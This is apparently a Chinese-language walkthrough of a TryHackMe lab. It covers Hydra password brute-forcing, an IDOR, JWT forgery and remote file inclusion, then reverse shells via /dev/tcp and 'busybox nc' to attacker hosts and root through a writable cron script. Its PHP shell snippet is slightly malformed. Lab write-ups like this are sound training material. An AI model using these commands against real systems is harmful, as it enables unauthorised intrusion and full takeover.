# Athena

> 🚩 **Athena** — TryHackMe
>
> [👉 点击进入靶场房间](https://tryhackme.com/room/domino)
>
---

### 1. 信息收集 (Recon)
执行端口扫描：
```bash
nmap -sC -sV 10.10.x.x
```
使用 Nmap 扫描目标时，我们可以发现有四个开放端口，每个端口运行不同的服务。端口 22 为 SSH，端口 80 为 HTTP。
![截图](./domino/01.png)

执行目录爆破工具：
```bash
gobuster dir -u ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```
![截图](./domino/02.png)

值得我们关注的有`config.php` `auth.php` `api` `backup` `admin`

进行网站访问，发现是一个登录入口，我们并没有账户数据，提示firstname.lastname
![截图](./domino/03.png)

访问Our Team，发现里有邮箱账号
![截图](./domino/04.png)

我们可以使用CeWL工具来收集账号信息，导入工具
```bash
git clone https://github.com/digininja/CeWL.git
cd CeWL
bundle install
chmod u+x ./cewl.rb
sudo ln -s $(pwd)/cewl.rb /usr/local/bin/cewl
```
之后运行
```bash
cewl -d 2 -m 3 --lowercase --with-numbers -e --email_file emails.txt -w cewl_words.txt ip
```
查看emails.txt

![截图](./domino/05.png)

将其分离开来
```bash
cut -d'@' -f1 emails.txt > username.txt
```
![截图](./domino/06.png)

我们使用工具Hydra，尝试爆破登录
```bash
hydra -L username.txt -P /usr/share/wordlists/rockyou.txt ip http-post-form '/index.php:username=^USER^&password=^PASS^:Invalid credentials' -T5
```
![截图](./domino/07.png)

### 2.以 sarah.johnson 登录
我们提供登录页面的凭证，并能够登录。

![截图](./domino/08.png)

页面上拥有路径，可以通过安全文件API访问内部文档`/api/files.php?name=` 和 需要通过JWT认证`/api/auth/token.php` ，我们先查看`MY Profile API` 

![截图](./domino/09.png)
发现URL尾部是3，可能存在越权问题，将其改为1，你可以获得第一个旗帜
![截图](./domino/10.png)

### 3.获取admin权限
访问`/api/auth/token.php`目录，看到token，将其复制
![截图](./domino/11.png)

我们用JWT网站来解析token
> [👉 JWT](https://www.jwt,io)

![截图](./domino/12.png)
解析时说我们签名有问题，我们将尾部.后的数据删除就可以看到结果

![截图](./domino/13.png)

我们尝试构建自己token，并将token复制下来
![截图](./domino/14.png)

访问目录`/admin`，发现是403页面
![截图](./domino/15.png)

在控制台页面，我们导入我们的token，并重新发送返回200 OK
![截图](./domino/16.png)

在Response里可以找到我们的第二个flag
![截图](./domino/17.png)

### 4.以www-data作为shell访问
![截图](./domino/18.png)
admin权限里还是要我们用`/api/files.php?name=`去访问内部的文件，我们改一下URL并发送

![截图](./domino/19.png)

返回error，它让我们用路径`/var/www/html/filename.txt`，我们尝试访问`/var/www/html/config.php`
![截图](./domino/20.png)

它返回了content数据，不过没有排序，我们将其保存到`config.txt`，并进行数据清洗
```bash
jq -r ".content" config.txt > clean.txt
```
返回了一段数据，看到pass，估计是登录密码，先留着
![截图](./domino/21.png)

我们在本地创建一个简单的反向连接shell，复制一下代码
```bash
<?
php system("bash -c 'bash -i >& /dev/tcp/ip/4444 0>&1'");
?>
```
然后用Python启动本地网站，然后用`/api/files.php?name=http://ip/shell.php` 来获取我们本地网站的数据包
![截图](./domino/22.png)

然后再启动Penelope工具，它是渗透测试人员和 CTF 玩家使用的现代 shell 处理器
> [👉 Github](https://github.com/brightio/penelope)
```bash
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py && python3 penelope.py
```
等待一会，连接上了www-data壳子，第三个flag，在`/opt/flag3.txt`可以查看
![截图](./domino/23.png)

### 5.登录devops 用户
在第四点里我们知道，'DB_PASS':D3v0ps!2024

通过`su`命令进行用户切换，成功进入用户devops里，查看flag
![截图](./domino/24.png)

### 6.提权至root
开启本地网站，在本地下载pspy64工具，然后在受控机里的tmp目录下导入进去
```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
```
然后进行赋权运行
![截图](./domino/25.png)

我们注意到`opt/monitoring/health_report.sh` 并查看是否有权修改
![截图](./domino/26.png)
![截图](./domino/27.png)
答案很显然，可以进行修改，我们只需在里面添加以下命令
```bash
busybox nc 192.168.135.32 4445 -e sh
```
![截图](./domino/28.png)
退出后没过多久，你将收到root shell
![截图](./domino/29.png)

如果不想退出重新连接，也可以写入
```bash
echo 'chmod +s /bin/bash' >> /opt/monitoring/health_report.sh
```
然后运行`bash -p` 也可以提权
![截图](./domino/30.png)

### 6.花絮
在信息收集途中我们遇到了`backup`这个网页目录，里面存放了两个文件`README.txt`和`config.enc`
![截图](./domino/31.png)
我们要对文件进行解密，需要通过网站
> [👉 CyberChef](https://gchq.github.io/CyberChef/#ienc=65001&oeol=VT)

我们查看文件`README.txt`
![截图](./domino/32.png)
让我们访问`static/app.js`
![截图](./domino/33.png)
它给的密钥是`N3xusK3y2024!!`,我们需要先给他转换为16进制，不要分隔符`4e337875734b3379323032342121`
如果位数不够要+0，解完如下
![截图](./domino/34.png)